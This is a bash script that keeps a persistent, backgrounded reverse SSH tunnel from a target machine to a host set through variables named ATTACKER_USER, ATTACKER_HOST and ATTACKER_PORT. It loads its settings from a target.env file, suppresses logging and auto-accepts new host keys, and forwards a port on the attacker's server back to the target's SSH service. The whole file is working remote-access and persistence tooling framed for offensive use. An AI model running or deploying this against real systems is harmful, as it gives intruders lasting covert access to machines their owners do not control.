#!/usr/bin/env bash
#===============================================================================
# reverse-ssh-autossh.sh - Reverse SSH tunnel using autossh
#===============================================================================
# This script uses autossh to maintain a persistent reverse tunnel.
# It loads configuration from target.env.
#
# Usage:
#   ./reverse-ssh-autossh.sh [-c CONFIG] [-v] [-h]
#
#===============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="$SCRIPT_DIR/target.env"
LOG_LEVEL_INFO=1
LOG_LEVEL_DEBUG=0
LOG_LEVEL=$LOG_LEVEL_INFO

# Simple logging
log() {
    local level="$1"; shift
    local msg="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    if [[ $level == "DEBUG" && $LOG_LEVEL -gt $LOG_LEVEL_DEBUG ]]; then
        return
    fi
    echo "[$timestamp] [$level] $msg"
}

usage() {
    cat <<EOF
Usage: $0 [options]

Options:
  -c CONFIG   Path to config file (default: ./target.env)
  -v          Verbose debug logging
  -h          Show help
EOF
    exit 0
}

while getopts "c:vh" opt; do
    case "$opt" in
        c) CONFIG_FILE="$OPTARG" ;;
        v) LOG_LEVEL=$LOG_LEVEL_DEBUG ;;
        h) usage ;;
    esac
done

if [[ -f "$CONFIG_FILE" ]]; then
    # shellcheck disable=SC1090
    source "$CONFIG_FILE"
else
    log "WARN" "Config file $CONFIG_FILE not found. Using environment variables."
fi

# Validate required variables
for var in ATTACKER_USER ATTACKER_HOST ATTACKER_PORT SSH_KEY REMOTE_FORWARD_PORT TARGET_SSH_HOST TARGET_SSH_PORT; do
    if [[ -z "${!var:-}" ]]; then
        log "ERROR" "Required variable '$var' is not set."
        exit 1
    fi
done

if ! command -v autossh >/dev/null 2>&1; then
    log "ERROR" "autossh is not installed. Please install it first."
    exit 1
fi

if [[ ! -f "$SSH_KEY" ]]; then
    log "ERROR" "SSH key not found: $SSH_KEY"
    exit 1
fi

chmod 600 "$SSH_KEY"

log "INFO" "Starting autossh reverse tunnel..."
log "DEBUG" "Forwarding remote port ${REMOTE_FORWARD_PORT} to ${TARGET_SSH_HOST}:${TARGET_SSH_PORT}"

# Construct autossh command
AUTOSSH_CMD=(
    autossh
    -M 0
    -f
    -N
    -i "$SSH_KEY"
    -R "${REMOTE_FORWARD_PORT}:${TARGET_SSH_HOST}:${TARGET_SSH_PORT}"
    -o "ServerAliveInterval=${SERVER_ALIVE_INTERVAL:-60}"
    -o "ServerAliveCountMax=${SERVER_ALIVE_COUNT_MAX:-3}"
    -o "ExitOnForwardFailure=yes"
    -o "StrictHostKeyChecking=accept-new"
    -o "UserKnownHostsFile=${SCRIPT_DIR}/known_hosts"
    -o "LogLevel=ERROR"
    -q
    -p "${ATTACKER_PORT}"
)

if [[ -n "${SSH_OPTIONS:-}" ]]; then
    # shellcheck disable=SC2206
    AUTOSSH_CMD+=($SSH_OPTIONS)
fi

AUTOSSH_CMD+=("${ATTACKER_USER}@${ATTACKER_HOST}")

# Run autossh
"${AUTOSSH_CMD[@]}"

log "INFO" "autossh started in background (PID: $!)."